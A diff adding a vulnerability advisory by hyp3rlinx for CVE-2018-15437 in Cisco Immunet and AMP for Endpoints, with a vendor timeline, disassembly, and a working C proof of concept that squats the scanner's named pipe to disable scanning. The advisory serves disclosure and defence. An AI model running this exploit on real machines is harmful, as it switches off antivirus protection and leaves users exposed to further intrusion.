@@ -1,0 +1,189 @@
+/*
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/CISCO-IMMUNET-AND-CISCO-AMP-FOR-ENDPOINTS-SYSTEM-SCAN-DENIAL-OF-SERVICE.txt
+[+] ISR: ApparitionSec
+
+
+***Greetz: indoushka | Eduardo B.***
+
+
+[Vendor]
+www.cisco.com
+
+
+[Multiple Products]
+Cisco Immunet < v6.2.0 and Cisco AMP For Endpoints v6.2.0
+
+
+Cisco Immunet is a free, cloud-based, community-driven antivirus application, using the ClamAV and its own engine.
+The software is complementary with existing antivirus software.
+
+Cisco AMP (Advanced Malware Protection)
+Advanced Malware Protection (AMP) goes beyond point-in-time capabilities and is built to protect organizations before, during, and after an attack. 
+
+
+[Vulnerability Type]
+System Scan Denial of Service
+
+
+[CVE Reference]
+CVE-2018-15437
+
+Cisco Advisory ID: cisco-sa-20181107-imm-dos
+Cisco Bug ID: CSCvk70945
+Cisco Bug ID: CSCvn05551
+
+
+CVSS Score:
+Base 5.5 CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H/E:X/RL:X/RC:X
+
+
+[Security Issue]
+A vulnerability in the system scanning component of Cisco Immunet and Cisco Advanced Malware Protection (AMP) for Endpoints running on
+Microsoft Windows could allow a local attacker to disable the scanning functionality of the product.
+
+This could allow executable files to be launched on the system without being analyzed for threats.
+The vulnerability is due to improper process resource handling.
+
+An attacker could exploit this vulnerability by gaining local access to a system running Microsoft Windows and protected by Cisco Immunet or 
+Cisco AMP for Endpoints and executing a malicious file.
+
+A successful exploit could allow the attacker to prevent the scanning services from functioning properly and ultimately prevent the system from
+being protected from further intrusion.
+
+There are no workarounds that address this vulnerability.
+
+Issue is due to a NULL DACL (RW Everyone) resulting in a system scan Denial Of Service vulnerability for both of these endpoint protection programs.
+
+The affected end user will get pop up warning box when attempting to perform a file or system scan,
+
+"You Can Not Scan at This Time
+
+"The Immunet service is not running.
+
+Please restart the service and retry."
+
+Below I provide details to exploit Cisco Immunet, however "Cisco AMP For Endpoints" is also affected so the exploit can easily be ported.
+
+[References]
+https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181107-imm-dos
+
+
+[Vulnerability Details]
+Pipe is Remote Accessible PIPE_REJECT_REMOTE_CLIENTS not present.
+
+FILE_FLAG_FIRST_PIPE_INSTANCE not present.
+
+Max Pipe Instances = FF (255)
+
+loc_140028140:
+
+lea     rax, [rbp+57h+pSecurityDescriptor]
+mov     [rbp+57h+SecurityAttributes.nLength], 18h
+mov     edx, 1          ; dwRevision
+mov     [rbp+57h+SecurityAttributes.lpSecurityDescriptor], rax
+lea     rcx, [rbp+57h+pSecurityDescriptor] ; pSecurityDescriptor
+mov     [rbp+57h+SecurityAttributes.bInheritHandle], 1
+call    cs:InitializeSecurityDescriptor
+xor     r9d, r9d        ; bDaclDefaulted
+lea     rcx, [rbp+57h+pSecurityDescriptor] ; pSecurityDescriptor
+xor     r8d, r8d        ; pDacl
+lea     edx, [r9+1]     ; bDaclPresent
+call    cs:SetSecurityDescriptorDacl
+mov     rcx, [rdi+18h]  ; lpName
+lea     rax, [rbp+57h+SecurityAttributes]
+mov     [rsp+100h+lpSecurityAttributes], rax ; lpSecurityAttributes
+mov     edx, 40000003h  ; dwOpenMode
+mov     [rsp+100h+nDefaultTimeOut], esi ; nDefaultTimeOut
+mov     r9d, 0FFh       ; nMaxInstances
+mov     [rsp+100h+nInBufferSize], 2000h ; nInBufferSize
+mov     r8d, 6          ; dwPipeMode
+mov     [rsp+100h+nOutBufferSize], 2000h ; nOutBufferSize
+call    cs:CreateNamedPipeW
+mov     [rdi+8], rax
+call    cs:GetLastError
+test    eax, eax
+jz      short loc_140028203
+ 
+
+ 
+[Exploit/POC]
+
+"Cisco-Immunet-Exploit.c"
+*/
+
+#include <windows.h> 
+#define pipename "\\\\.\\pipe\\IMMUNET_SCAN" 
+
+/* Discovered by hyp3rlinx
+   CVE-2018-15437  */
+ 
+int main(void) { 
+
+    while (TRUE){
+
+        HANDLE pipe = CreateNamedPipe(pipename, PIPE_ACCESS_INBOUND | PIPE_ACCESS_OUTBOUND , PIPE_WAIT, 1, 1024, 1024, 120 * 1000, NULL); 
+
+        if (pipe == INVALID_HANDLE_VALUE){
+
+           printf("Error: %d", GetLastError());
+
+        }else{
+
+        printf("%s","pipe created\n");
+
+        printf("%x",pipe);
+
+        }
+
+        ConnectNamedPipe(pipe, NULL);
+
+         if(ImpersonateNamedPipeClient(pipe)){  
+
+          printf("ok!");
+
+        }else{
+
+        printf("%s%d","WTF",GetLastError());
+
+        } 
+
+        CloseHandle(pipe);
+
+    }
+
+  return 0; 
+
+}
+
+/*
+[Network Access]
+Local / Remote
+
+
+
+[Severity]
+High
+
+
+
+Disclosure Timeline
+=============================
+Vendor Notification: August 7, 2018
+Vendor acknowledgement: August 7, 2018
+Vendor released fixes: November 7th, 2018
+November 8, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
+*/
